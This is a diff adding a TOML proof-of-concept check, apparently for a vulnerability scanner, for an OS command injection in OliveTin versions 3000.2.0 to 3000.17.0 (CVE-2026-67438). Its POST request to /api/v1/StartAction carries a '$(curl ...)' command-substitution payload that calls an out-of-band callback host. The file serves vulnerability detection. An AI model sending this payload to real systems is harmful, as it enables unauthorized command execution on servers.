@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 OliveTin 3000.2.0-3000.17.0 版本中 regex: 自定义参数类型绕过 Shell 安全检查导致的 OS 命令注入漏洞。通过向 /api/v1/StartAction 发送包含命令替换载荷的 POST 请求，验证任意命令执行。"
+id = "POC-AVE-2026-0969"
+name = "OliveTin OS Command Injection via Custom regex Argument Type PoC"
+severity = "medium"
+tags = ["ave-2026-0969"]
+vuln_id = [
+    "CVE-2026-67438",
+    "AVE-2026-0969",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/StartAction"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"bindingId":"custom_input","arguments":[{"name":"customInput","value":"$(curl -s http://{{interactsh-url}})"}]}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["200"]
